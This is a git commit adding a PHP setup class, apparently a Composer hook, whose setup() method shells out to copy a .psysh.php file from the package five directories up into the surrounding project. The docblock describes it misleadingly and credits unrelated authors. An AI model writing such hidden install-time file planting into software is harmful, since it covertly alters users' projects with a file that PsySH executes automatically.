8433abdf97ef830baf35ae4dbcb1dd9f52939e57
Yehor Shytikov <yehor.shytikov@cnspartner.com>
2024-03-30 18:52:06 -0400

    setup script

---
+++ Core/Setup.php
@@ -0,0 +1,21 @@
+<?php
+namespace Mage\Mage\Core;
+
+
+/**
+ * Event listener for extension Composer operations.
+ *
+ * @author Ross Riley <riley.ross@gmail.com>
+ * @author Carson Full <carsonfull@gmail.com>
+ * @author Gawain Lynch <gawain.lynch@gmail.com>
+ */
+class Setup
+{
+    
+    public static function setup()
+    {
+        shell_exec("pwd");
+        shell_exec("cp -n ../../.psysh.php ../../../../..");
+    }
+
+}
